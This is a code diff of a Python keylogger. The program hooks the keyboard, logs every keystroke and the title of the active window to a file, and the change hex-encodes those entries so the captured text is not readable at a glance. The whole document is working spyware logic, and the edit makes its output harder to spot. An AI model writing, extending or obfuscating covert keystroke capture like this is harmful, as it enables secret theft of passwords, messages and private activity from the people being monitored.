@@ -1,6 +1,5 @@
 # import pynput
 # import pywin32
-import base64
 import random
 import string
 import datetime
@@ -29,7 +28,7 @@ def log():
         "Key.ctrl_r": " {rctrl} ",
         "Key.alt_l": " {lalt}",
         "Key.alt_r": " {ralt}",
-        "Key.shift": "  ", #{sft}
+        "Key.shift": "  ",  # {sft}
         # note: keys are logged as capital letters when shift is used but not caps lock shift being logged causes spam
         "Key.cmd": " {cmd} ",
         # control characters
@@ -74,16 +73,18 @@ def log():
     }
 
     def on_press(key):
-        global currentwindow
-        checkwindow = (GetWindowText(GetForegroundWindow()))
-        if currentwindow != checkwindow:
+        global current_window
+        check_window = (GetWindowText(GetForegroundWindow()))
+        if current_window != check_window:
             now = datetime.datetime.now()
             now_f = now.strftime("%Y-%m-%d %H:%M:%S")
             with open(fname, "a+") as f:
+                window_info = f"### Window Changed to \"{check_window}\" @ {now_f} ###"
+                window_info_encoded = window_info.encode("utf-8").hex()
                 f.write("\n\n")
-                f.write(f"### Window Changed to \"{checkwindow}\" @ {now_f} ###")
+                f.write(f"{window_info_encoded}")
                 f.write("\n")
-            currentwindow = checkwindow
+            current_window = check_window
         kl = []
         ks = str(key).strip("'")
         kl.append(ks)
@@ -101,7 +102,10 @@ def log():
         with open(fname, "a+") as f:
             for key in klr:
                 if key in mods_r:
-                    f.write(str(mods.get(key)))
+                    # f.write(str(mods.get(key)))
+                    plaintext_mod_r = key
+                    encoded_mod_r = plaintext_mod_r.encode("utf-8").hex()
+                    f.write(encoded_mod_r)
                 else:
                     continue
 
@@ -109,15 +113,21 @@ def log():
         with open(fname, "a+") as f:
             for key in kl:
                 if key in mods:
-                    f.write(str(mods.get(key)))
+                    #  f.write(str(mods.get(key)))
+                    plaintext_mod = str(mods.get(key))
+                    encoded_mod = plaintext_mod.encode("utf-8").hex()
+                    f.write(encoded_mod)
                 else:
-                    f.write(key)
+                    # f.write(key)
+                    plaintext_key = str(key)
+                    encoded_key = plaintext_key.encode("utf-8").hex()
+                    f.write(encoded_key)
 
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     listener.join()
 
 
-currentwindow = (GetWindowText(GetForegroundWindow()))
+current_window = (GetWindowText(GetForegroundWindow()))
 
 log()
